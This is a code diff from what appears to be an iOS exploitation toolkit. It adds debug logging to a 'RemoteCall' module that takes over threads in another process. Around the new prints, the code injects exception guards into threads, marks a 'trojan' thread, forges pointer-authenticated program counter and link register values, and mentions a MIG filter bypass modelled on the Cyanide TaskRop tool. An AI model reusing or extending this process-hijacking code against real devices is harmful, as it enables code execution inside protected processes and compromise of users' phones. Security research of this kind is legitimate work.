@@ -809,10 +809,16 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
 
     ExceptionMessage exc;
     if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
-        printf("[%s:%d] Don't receive first exception on original thread\n", __FUNCTION__, __LINE__);
+        printf("[%s:%d] Don't receive first exception on original thread name=%s timeout=%d "
+               "(missed creator 0x101 → likely SIGBUS 0x201)\n",
+               __FUNCTION__, __LINE__, name ?: "?", newTimeout);
         g_RC_success = false;
         return 0;
     }
+    printf("[RemoteCall] DIAG temp/%s wait1 PC=0x%llx LR=0x%llx (expect 0x101 if post-creator)\n",
+           name ?: "?",
+           (unsigned long long)native_strip(exc.threadState.__pc),
+           (unsigned long long)native_strip(exc.threadState.__lr));
 
     exc.threadState.__x[0] = x0;
     exc.threadState.__x[1] = x1;
@@ -832,10 +838,17 @@ uint64_t do_remote_call_temp_internal(int timeout, const char *name,
 
     ExceptionMessage exc2;
     if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
-        printf("[%s:%d] Don't receive second exception on original thread\n", __FUNCTION__, __LINE__);
+        printf("[%s:%d] Don't receive second exception on original thread name=%s "
+               "(RET to FAKE_LR 0x201 uncaught?)\n",
+               __FUNCTION__, __LINE__, name ?: "?");
         g_RC_success = false;
         return 0;
     }
+    printf("[RemoteCall] DIAG temp/%s wait2 PC=0x%llx LR=0x%llx ret=0x%llx\n",
+           name ?: "?",
+           (unsigned long long)native_strip(exc2.threadState.__pc),
+           (unsigned long long)native_strip(exc2.threadState.__lr),
+           (unsigned long long)exc2.threadState.__x[0]);
     uint64_t retValue = exc2.threadState.__x[0];
     reply_with_state(&exc2, &exc2.threadState);
     if (remote_call_should_log_result(name, false))
@@ -1602,7 +1615,11 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                         g_RC_trojanThreadAddr = currThread;
                     successThreadCount++;
                     [g_RC_threadList addObject:@(currThread)];
-                    RC_DEBUG("[%s:%d] Inject EXC_GUARD on thread:0x%llx OK\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
+                    printf("[RemoteCall] inject[%d] thread=0x%llx trojan=0x%llx%s\n",
+                           successThreadCount,
+                           (unsigned long long)currThread,
+                           (unsigned long long)g_RC_trojanThreadAddr,
+                           (currThread == g_RC_trojanThreadAddr) ? " (signer)" : "");
                 }
             }
             validThreadCount++;
@@ -1664,6 +1681,26 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
 
     printf("[RemoteCall] Thread trapped — hijacking execution inside %s.\n", process);
     memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
+    printf("[RemoteCall] DIAG trap1 process=%s firstThread=0x%llx trojan=0x%llx "
+           "excPC=0x%llx excLR=0x%llx excSP=0x%llx flags=0x%x code=%llu/%llu injected=%lu\n",
+           process,
+           (unsigned long long)firstThread,
+           (unsigned long long)g_RC_trojanThreadAddr,
+           (unsigned long long)native_strip(exc.threadState.__pc),
+           (unsigned long long)native_strip(exc.threadState.__lr),
+           (unsigned long long)native_strip(exc.threadState.__sp),
+           (unsigned)exc.threadState.__flags,
+           (unsigned long long)exc.codeFirst,
+           (unsigned long long)exc.codeSecond,
+           (unsigned long)g_RC_threadList.count);
+    for (NSUInteger ti = 0; ti < g_RC_threadList.count; ti++) {
+        uint64_t t = g_RC_threadList[ti].unsignedLongLongValue;
+        printf("[RemoteCall] DIAG threadList[%lu]=0x%llx%s%s\n",
+               (unsigned long)ti,
+               (unsigned long long)t,
+               (t == firstThread) ? " first" : "",
+               (t == g_RC_trojanThreadAddr) ? " trojan" : "");
+    }
 
     for (NSNumber *thread in g_RC_threadList) {
         clear_guard_exception(thread.unsignedLongLongValue);
@@ -1672,16 +1709,29 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
 
     ExceptionMessage exc2;
     int desiredTimeout = 1500;
+    int drainHits = 0;
     while (wait_exception(firstExceptionPort, &exc2, desiredTimeout, false)) {
+        drainHits++;
+        printf("[RemoteCall] DIAG pre-creator drain hit#%d PC=0x%llx LR=0x%llx\n",
+               drainHits,
+               (unsigned long long)native_strip(exc2.threadState.__pc),
+               (unsigned long long)native_strip(exc2.threadState.__lr));
         reply_with_state(&exc2, &exc2.threadState);
     }
+    printf("[RemoteCall] DIAG pre-creator drain done hits=%d\n", drainHits);
 
     if (!g_RC_trojanThreadAddr)
         g_RC_trojanThreadAddr = firstThread;
 
     arm_thread_state64_internal newState = exc.threadState;
     sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
+    printf("[RemoteCall] DIAG creator-park signer=0x%llx signedPC=0x%llx signedLR=0x%llx flags=0x%x\n",
+           (unsigned long long)g_RC_trojanThreadAddr,
+           (unsigned long long)newState.__pc,
+           (unsigned long long)newState.__lr,
+           (unsigned)newState.__flags);
     reply_with_state(&exc, &newState);
+    printf("[RemoteCall] DIAG creator replied — next getpid must consume PC=0x101\n");
 
     // Cyanide TaskRop/RemoteCall.m: after creator reply there is NO wait/repark.
     // The 1500ms loop above is the PRE-creator drain (same as Cyanide). Post-reply
@@ -1705,7 +1755,10 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     g_RC_success = true;
 
     uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
+    printf("[RemoteCall] DIAG bootstrap getpid begin (must catch 0x101; miss → SIGBUS 0x201)\n");
     uint64_t bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
+    printf("[RemoteCall] DIAG bootstrap getpid done pid=%llu success=%d\n",
+           (unsigned long long)bootstrapPid, (int)g_RC_success);
     if (!g_RC_success || bootstrapPid == 0) {
         printf("[%s:%d] bootstrap getpid failed before synthetic thread creation\n",
                __FUNCTION__, __LINE__);
